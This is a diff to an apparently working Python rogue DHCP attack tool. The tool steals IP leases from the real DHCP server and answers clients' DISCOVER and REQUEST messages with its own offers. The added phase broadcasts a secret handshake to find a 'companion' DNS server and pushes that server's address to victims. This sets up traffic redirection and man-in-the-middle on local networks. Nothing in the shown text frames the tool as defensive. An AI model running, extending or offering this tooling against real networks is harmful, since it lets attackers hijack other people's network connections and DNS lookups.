@@ -85,7 +85,6 @@ class PortableRogueDHCP:
     # ==========================================
 
     def _build_base_reply(self, client_mac_str, client_mac_bytes, xid, op=2):
-        # Ensure chaddr is exactly 16 bytes
         padded_chaddr = client_mac_bytes + b'\x00' * (16 - len(client_mac_bytes))
         eth = Ether(src=self.server_mac, dst=client_mac_str)
         ip = IP(src=self.server_ip, dst="255.255.255.255")
@@ -153,7 +152,7 @@ class PortableRogueDHCP:
         return eth / ip / udp / bootp / DHCP(options=opts)
 
     # ==========================================
-    # --- PHASES AT STARTUP ---
+    # --- PHASES OF OPERATION ---
     # ==========================================
 
     def phase_1_recon(self):
@@ -178,6 +177,37 @@ class PortableRogueDHCP:
             print(f"        -> Real DHCP:    {self.network_info['real_dhcp_ip']}\n")
             return True
         return False
+
+    def phase_1_5_companion_discovery(self):
+        print("[*] PHASE 1.5: The Marco Polo DNS Companion Discovery")
+        discovery_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        discovery_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        discovery_socket.settimeout(2.0)
+
+        secret_msg = b"IM_A_BARBIE_GIRL_IN_A_BARBIE_WORLD"
+        expected_reply = b"COME_ON_BARBIE_LETS_GO_PARTY"
+
+        found = False
+        for attempt in range(1, 4):
+            print(f"    [~] Attempting to find DNS companion, pulse {attempt}/3 on port 9999...")
+            try:
+                discovery_socket.sendto(secret_msg, ('255.255.255.255', 9999))
+                data, addr = discovery_socket.recvfrom(1024)
+                if data == expected_reply:
+                    print(f"    [+] Companion DNS found at {addr[0]}! Updating network info.")
+                    self.network_info['dns'] = addr[0]
+                    found = True
+                    break
+            except socket.timeout:
+                continue
+            except Exception as e:
+                print(f"    [-] Socket error during discovery: {e}")
+
+        if not found:
+            print("    [-] No companion found. Falling back to default router DNS.")
+
+        discovery_socket.close()
+        print("")
 
     def phase_2_heist(self, count=10):
         print(f"[*] PHASE 2: IP Heist (Attempting to steal {count} IPs)")
@@ -289,9 +319,9 @@ class PortableRogueDHCP:
 
         if client_mac == self.server_mac: return
 
-        # --- DORA: DISCOVER ---
+        # --- DORA: Handle DISCOVER ---
         if msg_type == DHCP_DISCOVER:
-            print(f"\n[?] DISCOVER received from {client_mac} (XID: {xid})")
+            print(f"\n[?] [DISCOVER] received from {client_mac} (XID: {xid})")
 
             if client_mac in self.active_leases:
                 offer_ip = self.active_leases[client_mac]['ip']
@@ -311,13 +341,13 @@ class PortableRogueDHCP:
             offer_pkt = self.build_offer(client_mac, client_mac_bytes[:6], xid, offer_ip)
             sendp(offer_pkt, iface=self.iface, verbose=False)
 
-        # --- DORA: REQUEST ---
+        # --- DORA: Handle REQUEST ---
         elif msg_type == DHCP_REQUEST:
             requested_server_id = opts.get('server_id')
             req_ip = opts.get('requested_addr')
             if not req_ip: req_ip = packet[BOOTP].ciaddr
 
-            print(f"\n[?] REQUEST received from {client_mac} for {req_ip} (Target Server: {requested_server_id})")
+            print(f"\n[?] [REQUEST] received from {client_mac} for {req_ip} (Target Server: {requested_server_id})")
 
             # VALIDATION 1: Is this request meant for this server?
             if requested_server_id == self.server_ip or requested_server_id is None:
@@ -360,6 +390,7 @@ class PortableRogueDHCP:
 
     def start(self):
         if self.phase_1_recon():
+            self.phase_1_5_companion_discovery()
             self.phase_2_heist(count=10)
             if self.stolen_leases:
                 threading.Thread(target=self.background_state_manager, daemon=True).start()
